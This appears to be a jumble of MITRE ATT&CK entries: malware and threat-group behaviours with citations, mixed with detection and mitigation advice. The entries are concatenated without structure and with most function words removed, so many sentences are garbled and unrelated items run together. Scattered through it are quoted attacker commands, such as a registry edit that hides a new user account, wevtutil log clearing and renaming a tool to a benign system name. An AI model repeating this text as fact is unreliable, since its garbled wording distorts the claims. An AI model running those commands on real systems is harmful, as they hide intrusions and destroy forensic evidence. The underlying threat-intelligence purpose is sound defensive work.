<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe</code>. [Cobalt Strike](https://attack.mitre.org/software/S0154) identify targets querying account domain contoller.(Citation: Cobalt Strike Manual 4.3 November 2020) [TINYTYPHON](https://attack.mitre.org/software/S0131) XOR 0x90 obfuscate configuration file.(Citation: Forcepoint Monsoon) Develop publish policies define acceptable stored Confluence repositories. [Ramsay](https://attack.mitre.org/software/S0458) stage data prior exfiltration <code>%APPDATA%\Microsoft\UserSetting</code> <code>%APPDATA%\Microsoft\UserSetting\MediaCache</code>.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [HTRAN](https://attack.mitre.org/software/S0040) install rootkit hide network connections host OS.(Citation: NCSC Joint Report Public Tools) [EnvyScout](https://attack.mitre.org/software/S0634) ability proxy execution malicious files Rundll32.(Citation: MSTIC Nobelium Toolset 2021) [Kinsing](https://attack.mitre.org/software/S0599) searched <code>bash_history</code> credentials.(Citation: Aqua Kinsing April 2020) [S-Type](https://attack.mitre.org/software/S0085) port 80 C2, falls ports 443 8080 initial communication fails.(Citation: Cylance Dust Storm) [APT37](https://attack.mitre.org/groups/G0067) identifies victim username.(Citation: Talos Group123) [Cyclops Blink](https://attack.mitre.org/software/S0687) maintained persistence patching legitimate device firmware downloaded, including WatchGuard devices.(Citation: NCSC Cyclops Blink February 2022) [TSCookie](https://attack.mitre.org/software/S0436) ability discover drive infected host.(Citation: JPCert TSCookie March 2018) [Pony](https://attack.mitre.org/software/S0453) attachments delivered compressed archive files. [Pony](https://attack.mitre.org/software/S0453) obfuscates memory flow adding junk instructions executing analysis difficult.(Citation: Malwarebytes Pony April 2016)	 [Carbanak](https://attack.mitre.org/software/S0030) enables concurrent Remote Desktop Protocol (RDP) sessions.(Citation: FireEye CARBANAK June 2017) [njRAT](https://attack.mitre.org/software/S0385) identify remote hosts connected networks.(Citation: Fidelis njRAT June 2013) [ZxShell](https://attack.mitre.org/software/S0412) capture screenshots.(Citation: FireEye APT41 Aug 2019) (Citation: Trend Micro DRBControl February 2020) Monitor newly constructed logon behavior cloud service management consoles. adversary administrator level access local technique; restrict users accounts privileges require.   [Nebulae](https://attack.mitre.org/software/S0630) TCP C2 communications.(Citation: Bitdefender Naikon April 2021) [Darkhotel](https://attack.mitre.org/groups/G0012) decrypted strings imports RC4 execution.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [Inception](https://attack.mitre.org/groups/G0100) reconnaissance module gather operating hardware infected host.(Citation: Symantec Inception Framework March 2018) [FIN6](https://attack.mitre.org/groups/G0037) Registry establish persistence downloader tools HARDTACK SHIPBREAD.(Citation: FireEye FIN6 April 2016) [Shamoon](https://attack.mitre.org/software/S0140) attempts overwrite operating files disk structures image files.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016) variant, randomly generated data data overwrites.(Citation: Unit 42 Shamoon3 2018)(Citation: McAfee Shamoon December 2018) (Citation: Zscaler Lyceum DnsSystem June 2022) Modify network host firewall rules, network controls, legitimate BITS traffic. Monitor executed commands arguments commands disable logging. example, [Wevtutil](https://attack.mitre.org/software/S0645), auditpol, EventLog, offensive tooling (such [Mimikatz](https://attack.mitre.org/software/S0002) Invoke-Phant0m) logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering) (Citation: Baumgartner Naikon 2015) C2 server response beacon variant [Emissary](https://attack.mitre.org/software/S0082) 36-character GUID encryption key subsequent network communications. variants [Emissary](https://attack.mitre.org/software/S0082) XOR operations encrypt C2 data.(Citation: Lotus Blossom Dec 2015) [CARROTBALL](https://attack.mitre.org/software/S0465) ability FTP C2 communications.(Citation: Unit 42 CARROTBAT January 2020) Administrators audit cloud container accounts ensure permissions granted appropriate.  Additionally, administrators perform audit OAuth applications permissions granted access organizational data. extensively applications establish baseline, periodic audits updated applications. Suspicious applications investigated removed. Change GPOs define shorter timeouts sessions maximum time single session active. Change GPOs maximum time disconnected session stays active session host server.(Citation: Windows RDP Sessions) Mitigation variants technique achieved stateful firewalls, depending implemented. Monitor logs generated serverless execution unusual activity. example, Exchange environments emails Power Automate Outlook 365 connector include phrase ‘Power App’ ‘Power Automate’ SMTP header 'x-ms-mail-application.'(Citation: Power Automate Email Exfiltration Controls) original variant [FakeM](https://attack.mitre.org/software/S0076) encrypts C2 traffic custom encryption cipher XOR key “YHCRA” bit rotation XOR operation. variants [FakeM](https://attack.mitre.org/software/S0076) RC4 encrypt C2 traffic.(Citation: Scarlet Mimic Jan 2016) [QakBot](https://attack.mitre.org/software/S0650) RC4 encrypt strings C2 communication.(Citation: Kaspersky QakBot September 2021) Monitor files account settings, `/etc/ssh/sshd_config` authorized_keys file user system. Set account lockout policies failed login attempts prevent passwords guessed. strict policy create denial service condition render environments un-usable, accounts brute force locked-out. [Dtrack](https://attack.mitre.org/software/S0567) retrieve browser history.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) [Kimsuky](https://attack.mitre.org/groups/G0094) <code>reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v</code> hide newly created user.(Citation: KISA Operation Muzabi) [APT28](https://attack.mitre.org/groups/G0007) brute-force/password-spray tooling operated modes: brute-force mode typically 300 authentication attempts hour targeted account hours days.(Citation: STRONTIUM Patterns Cred Harvesting Sept 2020) [APT28](https://attack.mitre.org/groups/G0007) Kubernetes cluster conduct distributed, large-scale password guessing attacks.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [APT28](https://attack.mitre.org/groups/G0007) cleared event logs, including commands <code>wevtutil System</code> <code>wevtutil Security</code>.(Citation: Crowdstrike DNC June 2016)(Citation: DOJ GRU Indictment Jul 2018) [PlugX](https://attack.mitre.org/software/S0013) module list processes running machine.(Citation: CIRCL PlugX March 2013) [Ajax Security Team](https://attack.mitre.org/groups/G0130) personalized spearphishing attachments.(Citation: Check Rocket Kitten) [SoreFang](https://attack.mitre.org/software/S0516) C2 communications.(Citation: CISA SoreFang July 2016)(Citation: NCSC APT29 July 2020) Encrypt data flows reduce impact tailored modifications data transit. (Citation: CrowdStrike Wizard Spider October 2020) [BoomBox](https://attack.mitre.org/software/S0635) gained execution user interaction malicious file.(Citation: MSTIC Nobelium Toolset 2021) [BITTER](https://attack.mitre.org/groups/G1002) RAR SFX dropper deliver malware.(Citation: Forcepoint BITTER Pakistan Oct 2016) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Smoke Loader](https://attack.mitre.org/software/S0226) downloads version installed. downloads additional plugins.(Citation: Malwarebytes SmokeLoader 2016) [APT39](https://attack.mitre.org/groups/G0087) packed tools UPX, repacked modified version [Mimikatz](https://attack.mitre.org/software/S0002) thwart anti-virus detection.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020) [PowerSploit](https://attack.mitre.org/software/S0194) collection CodeExecution modules inject code (DLL, shellcode) process.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) Monitor analyze network packet contents detect application layer protocols, leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, protocol port mismatch, anomalous syntax, structure). packet inspection Wake-on-LAN magic packet consists 6 bytes <code>FF</code> sixteen repetitions target system's IEEE address. string packet's payload indicative Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN) [Metamorfo](https://attack.mitre.org/software/S0455) raw TCP C2.(Citation: FireEye Metamorfo Apr 2018)  [PowerLess](https://attack.mitre.org/software/S1012) download additional payloads compromised host.(Citation: Cybereason PowerLess February 2022) [FELIXROOT](https://attack.mitre.org/software/S0267) collects victim’s name, processor architecture, OS version, volume serial number, type.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) [GrimAgent](https://attack.mitre.org/software/S0632) enumerate IP domain target system.(Citation: IB GrimAgent July 2021) [LightNeuron](https://attack.mitre.org/software/S0395) controlled commands embedded PDFs JPGs steganographic methods.(Citation: ESET LightNeuron 2019) [Empire](https://attack.mitre.org/software/S0363) automatically gather username, domain name, machine name, compromised system.(Citation: Talos Frankenstein June 2019) Monitoring suspicious processes spawned gather variety perform forms [Discovery](https://attack.mitre.org/tactics/TA0007), short period time, aid detection. Detecting environmental keying difficult depending implementation. [Metamorfo](https://attack.mitre.org/software/S0455) configured persistence Registry ket <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe</code> .LNK files startup folder achieve persistence.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers retrieve name, OS version, processor speed, memory size, CPU speed.(Citation: Symantec Hydraq Jan 2010) [Cobalt Strike](https://attack.mitre.org/software/S0154) produce sessions report compromised hosts.(Citation: Talos Cobalt Strike September 2020) [RARSTONE](https://attack.mitre.org/software/S0055) downloads backdoor component C2 server loads memory.(Citation: Aquino RARSTONE) [Cobalt Group](https://attack.mitre.org/groups/G0080) malicious Word OLE compound documents victims.(Citation: Talos Cobalt July 2018) [Pysa](https://attack.mitre.org/software/S0583) extracted credentials password database encrypting files.(Citation: CERT-FR PYSA April 2020)  [Lazarus Group](https://attack.mitre.org/groups/G0032) malware families encrypt C2 traffic custom code XOR ADD operation XOR operation. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample XORs C2 traffic. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware Caracachs encryption encrypt C2 payloads. [Lazarus Group](https://attack.mitre.org/groups/G0032) AES encrypt C2 traffic.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret)(Citation: McAfee Lazarus Jul 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) download additional malware plug-in modules execute victim’s machine.(Citation: GDATA Zeus Panda June 2017) [Mongall](https://attack.mitre.org/software/S1026) ability RC4 encrypt C2 communications.(Citation: SentinelOne Aoqin Dragon June 2022) [Kimsuky](https://attack.mitre.org/groups/G0094) Google Chrome browser extensions infect victims steal passwords cookies.(Citation: Zdnet Kimsuky Dec 2018)(Citation: Netscout Stolen Pencil Dec 2018) [Hildegard](https://attack.mitre.org/software/S0601) masscan kubelets internal Kubernetes network.(Citation: Unit 42 Hildegard Malware) Monitor newly executed processes create modify Launch Daemons execute malicious payloads persistence. [Blue Mockingbird](https://attack.mitre.org/groups/G0108) frp, ssf, Venom establish SOCKS proxy connections.(Citation: RedCanary Mockingbird 2020) [APT1](https://attack.mitre.org/groups/G0006) batch script perform series discovery techniques saves file.(Citation: Mandiant APT1) Regularly scan externally facing systems vulnerabilities establish procedures rapidly patch systems critical vulnerabilities discovered scanning public disclosure.(Citation: OWASP 10) [RTM](https://attack.mitre.org/software/S0148) victim time zone.(Citation: ESET RTM Feb 2017) [Dacls](https://attack.mitre.org/software/S0497) establish persistence LaunchAgent.(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors downloaded files tools victim machine.(Citation: Talos Frankenstein June 2019) [SamSam](https://attack.mitre.org/software/S0370) garbage code pad malware components.(Citation: Sophos SamSam Apr 2018) [Bumblebee](https://attack.mitre.org/software/S1039) capture compress stolen credentials Registry volume shadow copies.(Citation: Cybereason Bumblebee August 2022) [Hildegard](https://attack.mitre.org/software/S0601) executed unsecure kubelet allowed anonymous access victim environment.(Citation: Unit 42 Hildegard Malware) [SLOWDRIFT](https://attack.mitre.org/software/S0218) downloads additional payloads.(Citation: FireEye APT37 Feb 2018) [APT39](https://attack.mitre.org/groups/G0087) exfiltrated stolen victim data C2 communications.(Citation: FBI FLASH APT39 September 2020) [AuditCred](https://attack.mitre.org/software/S0347) inject code files running processes.(Citation: TrendMicro Lazarus Nov 2018) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) Windows specific tool xxmm bypass UAC privilege escalation.(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) [Mustang Panda](https://attack.mitre.org/groups/G0129) communicated C2 POST requests.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Recorded Future REDDELTA July 2020)(Citation: McAfee Dianxun March 2021) [njRAT](https://attack.mitre.org/software/S0385) capable deleting files.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [Carberp](https://attack.mitre.org/software/S0484) captured credentials user performs login SSL session.(Citation: Prevx Carberp March 2011)(Citation: Trusteer Carberp October 2010) Enforce proxies dedicated servers services DNS systems communicate respective ports/protocols, systems network.  [BitPaymer](https://attack.mitre.org/software/S0570) import hard-coded RSA 1024-bit public key, generate 128-bit RC4 key file, encrypt file place, appending <code>.locked</code> filename.(Citation: Crowdstrike Indrik November 2018) Commands <code>net use</code> <code>net session</code> [Net](https://attack.mitre.org/software/S0039) gather network connections host.(Citation: Savill 1999) [GuLoader](https://attack.mitre.org/software/S0561) ability perform anti-VM anti-sandbox checks string hashing, API <code>EnumWindows</code>, checking Qemu guest agent.(Citation: Medium Eli Salem GuLoader April 2021) [Crimson](https://attack.mitre.org/software/S0115) command collect victim PC name, disk drive information, operating system.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [PlugX](https://attack.mitre.org/software/S0013) enumerate query contained Windows Registry.(Citation: Lastline PlugX Analysis)(Citation: CIRCL PlugX March 2013) Versions [Babuk](https://attack.mitre.org/software/S0638) packed.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: Medium Babuk February 2021) Audit Registry entries relevant enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins) [APT41](https://attack.mitre.org/groups/G0096) attempted remove evidence activity clearing Windows security events.(Citation: FireEye APT41 Aug 2019) (Citation: Cylance Dust Storm) Analyze process behavior determine process performing actions align logged command-line arguments.

Detection process argument spoofing difficult adversaries momentarily modify stored arguments malicious execution. bypass process creation detection process memory analysis. monitoring [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), includes monitoring process creation (especially suspended state) access modifications processes (especially parent process) Windows API calls.(Citation: Nviso Spoof Command 2020)(Citation: Mandiant Endpoint Evading 2019) [Denis](https://attack.mitre.org/software/S0354) <code>ipconfig</code> gather IP address system.(Citation: Cybereason Cobalt Kitty 2017) auditing tools capable detecting hijacking opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems hijacking weaknesses.(Citation: Powersploit)

Use program sxstrace.exe included Windows manual inspection check manifest files side-loading vulnerabilities software.

Find eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions them. aware search Windows executing loading binaries qualified paths appropriate.

Clean Windows Registry software uninstalled avoid legitimate binaries. Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations.(Citation: CreateProcess)(Citation: Dynamic-Link Library Security)(Citation: Vulnerability Exploit Detector) [menuPass](https://attack.mitre.org/groups/G0045) tools scan NetBIOS nameservers enumerate NetBIOS sessions.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) deleted exfiltrated data disk transmission. [Kimsuky](https://attack.mitre.org/groups/G0094) instrumentor script terminate browser processes running infected delete cookie files disk.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) Audit domain account permission levels routinely situations adversary gain wide access obtaining credentials privileged account. user admin domain accounts local administrator systems tightly controlled accounts segmented, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. Limit credential overlap systems prevent access account credentials obtained. [EvilBunny](https://attack.mitre.org/software/S0396)'s dropper checked processes strings file identify malware sandbox environment.(Citation: Cyphort EvilBunny Dec 2014)	 [Threat Group-3390](https://attack.mitre.org/groups/G0027) modified version Mimikatz called Wrapikatz.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda 2018)(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020)(Citation: Profero APT27 December 2020) [Lucifer](https://attack.mitre.org/software/S0532) remove event logs.(Citation: Unit 42 Lucifer June 2020) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module perform brute force attacks system.(Citation: ClearSky Lebanese Cedar Jan 2021)  (Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [Chaes](https://attack.mitre.org/software/S0631) delivered sending victims phishing email malicious .docx file.(Citation: Cybereason Chaes Nov 2020) Applications send push notifications verify login form multi-factor authentication (MFA). Train users accept valid push notifications report suspicious push notifications. [FinFisher](https://attack.mitre.org/software/S0182) injects processes depending integrity integrity.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) (Citation: Checkpoint MosesStaff Nov 2021) [WhisperGate](https://attack.mitre.org/software/S0689) Base64 encode strings, store downloaded files reverse byte order,  Eazfuscator tool obfuscate stage.(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [Transparent Tribe](https://attack.mitre.org/groups/G0134) mimic legitimate Windows directories icons names.(Citation: Kaspersky Transparent Tribe August 2020) (Citation: FireEye APT41 Aug 2019) (Citation: Dragos Crashoverride 2018) [AuditCred](https://attack.mitre.org/software/S0347) download files additional malware.(Citation: TrendMicro Lazarus Nov 2018) (Citation: Kaspersky CactusPete Aug 2020)(Citation: Secureworks BRONZE HUNTLEY )(Citation: Talos Bisonal Mar 2020)  [EnvyScout](https://attack.mitre.org/software/S0634) collect sensitive NTLM material compromised host.(Citation: MSTIC Nobelium Toolset 2021) [Seasalt](https://attack.mitre.org/software/S0345) command perform process listing.(Citation: Mandiant APT1 Appendix) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers passwords multiple sources, including Windows Credential Vault Outlook.(Citation: Citizen Lab Stealth Falcon 2016) [S-Type](https://attack.mitre.org/software/S0085) C2.(Citation: Cylance Dust Storm) [WarzoneRAT](https://attack.mitre.org/software/S0670) disarm Windows Defender UAC process evade detection.(Citation: Check Warzone Feb 2020)  privilege service accounts limit permissions exploited process rest system. [Dragonfly](https://attack.mitre.org/groups/G0035) queried Registry identify victim information.(Citation: US-CERT TA18-074A) [CSPY Downloader](https://attack.mitre.org/software/S0527) write Registry <code>%windir%</code> variable execute tasks.(Citation: Cybereason Kimsuky November 2020) [PipeMon](https://attack.mitre.org/software/S0501) inject modules processes reflective DLL loading.(Citation: ESET PipeMon 2020) [Bazar](https://attack.mitre.org/software/S0534) attempt overload sandbox analysis sending 1550 calls <code>printf</code>.(Citation: Cybereason Bazar July 2020) binaries application updates patches extremely suspicious. [Deep Panda](https://attack.mitre.org/groups/G0009) updated modified malware, hash values evade detection.(Citation: Symantec Black Vine) [Cardinal RAT](https://attack.mitre.org/software/S0348) secret key series XOR addition operations encrypt C2 traffic.(Citation: PaloAlto CardinalRat Apr 2017) [Chaos](https://attack.mitre.org/software/S0220) reverse connection 8338/TCP, encrypted AES.(Citation: Chaos Stolen Backdoor) [FunnyDream](https://attack.mitre.org/software/S1044) connect proxies TCP create tunnel C2.(Citation: Bitdefender FunnyDream Campaign November 2020) Continuous monitoring vulnerability sources automatic manual code review tools implemented well.(Citation: OWASP 10) [CosmicDuke](https://attack.mitre.org/software/S0050) collects user credentials, including passwords, programs including popular instant messaging applications email clients WLAN keys.(Citation: F-Secure Dukes) [Agent Tesla](https://attack.mitre.org/software/S0331) code obfuscated apparent attempt analysis difficult.(Citation: Fortinet Agent Tesla April 2018) [Agent Tesla](https://attack.mitre.org/software/S0331) Rijndael symmetric encryption algorithm encrypt strings.(Citation: Malwarebytes Agent Tesla April 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors created services remote systems execution purposes.(Citation: FoxIT Wocao December 2019) [APT3](https://attack.mitre.org/groups/G0022) tool enumerate current network connections.(Citation: Symantec Buckeye)(Citation: FireEye Clandestine Fox)(Citation: evolution pirpi) [Olympic Destroyer](https://attack.mitre.org/software/S0365) attempt Security event logs <code>wevtutil</code>.(Citation: Talos Olympic Destroyer 2018) Monitor newly constructed processes command-lines execute svchost.exe Windows Windows Task Scheduler taskeng.exe versions Windows. (Citation: Twitter Leoloobeek Scheduled Task) scheduled tasks persistence, adversary remove task action complete. [PowerSploit](https://attack.mitre.org/software/S0194) collection ScriptModification modules compress encode scripts payloads.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Pupy](https://attack.mitre.org/software/S0192) built commands identify host’s IP address network configuration settings viewing connected sessions.(Citation: GitHub Pupy) [Kasidet](https://attack.mitre.org/software/S0088) ability search process processes running system.(Citation: Zscaler Kasidet) Monitor files <code>/Library/LaunchDaemons/</code> folder. LaunchDaemons protected SIP. Enforce authentication role-based access control container service restrict users privileges required.(Citation: Kubernetes Hardening Guide) Detection steganography difficult artifacts left obfuscation process detectable signature. strings signatures left artifacts decoding steganography. [NOKKI](https://attack.mitre.org/software/S0353) collect current timestamp victim's machine.(Citation: Unit 42 NOKKI Sept 2018) [admin@338](https://attack.mitre.org/groups/G0018) actors command rename tools benign file name: <code>ren "%temp%\upload" audiodg.exe</code>(Citation: FireEye admin@338) Monitor newly constructed processes command-lines aid compression encrypting data collected prior exfiltration, 7-Zip, WinRAR, WinZip.   Monitor unexpected network share access, files transferred shares network protocols SMB. [IndigoZebra](https://attack.mitre.org/groups/G0136) established domains, designed official government domains, operations.(Citation: Checkpoint IndigoZebra July 2021) Review privileged cloud account permission levels routinely adversary gain wide access.(Citation: TechNet Credential Theft)(Citation: TechNet Privilege) reviews check privileged cloud accounts created authorized. [Fox Kitten](https://attack.mitre.org/groups/G0117) accessed files gain valid credentials.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [C0015](https://attack.mitre.org/campaigns/C0015), PowerView's file share enumeration stored file `c:\ProgramData\found_shares.txt`.(Citation: DFIR Conti Bazar Nov 2021) [Diavol](https://attack.mitre.org/software/S0659) spread network SMB prior encryption.(Citation: Fortinet Diavol July 2021) [JPIN](https://attack.mitre.org/software/S0201) send email SMTP.(Citation: PLATINUM April 2016) [APT29](https://attack.mitre.org/groups/G0016) changed domain federation trust settings Azure administrative permissions configure domain accept authorization tokens signed SAML signing certificate.(Citation: 365 Defender Solorigate)(Citation: Secureworks IRON RITUAL Profile) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers list running processes.(Citation: Citizen Lab Stealth Falcon 2016) [FIN10](https://attack.mitre.org/groups/G0051) executed malicious .bat files PowerShell commands.(Citation: FireEye FIN10 June 2017) [RDAT](https://attack.mitre.org/software/S0495) communicate C2 base32-encoded subdomains.(Citation: Unit42 RDAT July 2020)	 [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors PowerShell series Base64-encoded commands acted stager enumerated hosts.(Citation: Talos Frankenstein June 2019) [Remexi](https://attack.mitre.org/software/S0375) gathers exfiltrates keystrokes machine.(Citation: Securelist Remexi Jan 2019) Encryption off-system storage sensitive mitigate collection files, adversary acquiring intrusion persists period time adversary discover access data means. [Kwampirs](https://attack.mitre.org/software/S0236) collects list files directories C:\ command <code>dir /s /a c:\ >> "C:\windows\TEMP\[RANDOM].tmp"</code>.(Citation: Symantec Orangeworm April 2018) [PingPull](https://attack.mitre.org/software/S1031) retrieve hostname compromised host.(Citation: Unit 42 PingPull Jun 2022) <code>net \\system\share /delete</code> command [Net](https://attack.mitre.org/software/S0039) remove established connection network share.(Citation: Technet Use) [Metamorfo](https://attack.mitre.org/software/S0455) send data collects C2 server.(Citation: ESET Casbaneiro Oct 2019)  (Citation: Cybereason Soft Cell June 2019) [Nerex](https://attack.mitre.org/software/S0210) drops signed DLL disk.(Citation: Symantec Nerex 2012) [Ryuk](https://attack.mitre.org/software/S0446) observed query registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> <code>InstallLanguage</code>. machine 0x419 (Russian), 0x422 (Ukrainian), 0x423 (Belarusian), stops execution.(Citation: CrowdStrike Ryuk January 2019) [BloodHound](https://attack.mitre.org/software/S0521) collect domain users, including identification domain admin accounts.(Citation: CrowdStrike BloodHound April 2018) Monitor API calls delete alter generated artifacts host system, including logs captured files quarantined malware. [FatDuke](https://attack.mitre.org/software/S0512) C2 servers targeted organization.(Citation: ESET Dukes October 2019) [POORAIM](https://attack.mitre.org/software/S0216) perform screen capturing.(Citation: FireEye APT37 Feb 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flow (e.g. snmp traffic originating unauthorized untrusted hosts, signature detection strings mapped device configuration(s), anomolies snmp request(s)) [LazyScripter](https://attack.mitre.org/groups/G0140) GitHub host payloads operate spam campaigns.(Citation: MalwareBytes LazyScripter Feb 2021)  [HyperBro](https://attack.mitre.org/software/S0398) HTTPS C2 communications.(Citation: Unit42 Emissary Panda 2019) [Milan](https://attack.mitre.org/software/S1015) received files C2 stored log folders character sequence `a9850d2f`.(Citation: ClearSky Siamesekitten August 2021) [PyDCrypt](https://attack.mitre.org/software/S1032) decrypted dropped [DCSrv](https://attack.mitre.org/software/S1033) payload disk.(Citation: Checkpoint MosesStaff Nov 2021) [SideCopy](https://attack.mitre.org/groups/G1008) identified IP address compromised host.(Citation: MalwareBytes SideCopy Dec 2021) [Wizard Spider](https://attack.mitre.org/groups/G0102) icacls command modify access control backup servers, providing control folders.(Citation: Sophos Ryuk Attack October 2020) [Indrik Spider](https://attack.mitre.org/groups/G0119) [Cobalt Strike](https://attack.mitre.org/software/S0154) log files.(Citation: Symantec WastedLocker June 2020) [ThreatNeedle](https://attack.mitre.org/software/S0665) download additional tools enable lateral movement.(Citation: Kaspersky ThreatNeedle Feb 2021) [APT39](https://attack.mitre.org/groups/G0087) spearphishing emails attempt lure users malicious attachment.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020)(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) [ZxxZ](https://attack.mitre.org/software/S1013) search registry compromised host.(Citation: Cisco Talos Bitter Bangladesh 2022) [Sakula](https://attack.mitre.org/software/S0074) encodes C2 traffic single-byte XOR keys.(Citation: Dell Sakula) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s potential victim organizations included identification collection employee information.(Citation: District Court Indictment GRU Unit 74455 October 2020) [JPIN](https://attack.mitre.org/software/S0201) security settings changing Registry keys.(Citation: PLATINUM April 2016) [jRAT](https://attack.mitre.org/software/S0283) collects OS (version, build type, install date) up-time receiving connection backdoor.(Citation: Symantec Frutas Feb 2013) Exploitation defense evasion happen shortly compromised prevent detection actions additional tools brought used. Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash.  [TeamTNT](https://attack.mitre.org/groups/G0139) locally staged files collected credentials C2 servers cURL.(Citation: Cisco Talos Intelligence Group) [APT29](https://attack.mitre.org/groups/G0016) leveraged numerous pieces malware unique [APT29](https://attack.mitre.org/groups/G0016) developed group.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Deep Dive Solorigate January 2021) [DEATHRANSOM](https://attack.mitre.org/software/S0616) delete volume shadow copies compromised hosts.(Citation: FireEye FiveHands April 2021) [MCMD](https://attack.mitre.org/software/S0500) launch console process (cmd.exe) redirected standard input output.(Citation: Secureworks MCMD July 2019) [POWERSTATS](https://attack.mitre.org/software/S0223) retrieve OS name/architecture computer/domain compromised hosts.(Citation: FireEye MuddyWater Mar 2018)(Citation: TrendMicro POWERSTATS V3 June 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) utilize cmd.exe execute commands victim's environment.(Citation: Kaspersky Ferocious Kitten Jun 2021) adversaries provisioned software compromised VPS (ex: command control server), internet scans reveal VPSs adversaries compromised. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)
 multi-factor authentication user privileged accounts. [RGDoor](https://attack.mitre.org/software/S0258) C2 communications.(Citation: Unit 42 RGDoor Jan 2018) [Shamoon](https://attack.mitre.org/software/S0140) creates service named “ntssrv” execute payload. versions create "MaintenaceSrv" "hdv_725x" services.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [RCSession](https://attack.mitre.org/software/S0662) capture screenshots compromised host.(Citation: Profero APT27 December 2020) [ROKRAT](https://attack.mitre.org/software/S0240) check debugging tools.(Citation: Talos Group123)(Citation: NCCGroup RokRat Nov 2018)(Citation: Malwarebytes RokRAT VBA January 2021) [Saint Bot](https://attack.mitre.org/software/S1018) identify OS version, CPU, details victim's machine.(Citation: Malwarebytes Saint Bot April 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [APT1](https://attack.mitre.org/groups/G0006) utilities, GETMAIL MAPIGET, steal email. MAPIGET steals email Exchange servers archived.(Citation: Mandiant APT1) [Indrik Spider](https://attack.mitre.org/groups/G0119) [PsExec](https://attack.mitre.org/software/S0029) leverage Windows Defender disable scanning downloaded files restrict real-time monitoring.(Citation: Symantec WastedLocker June 2020) create interact ADSs Windows utilities. Monitor 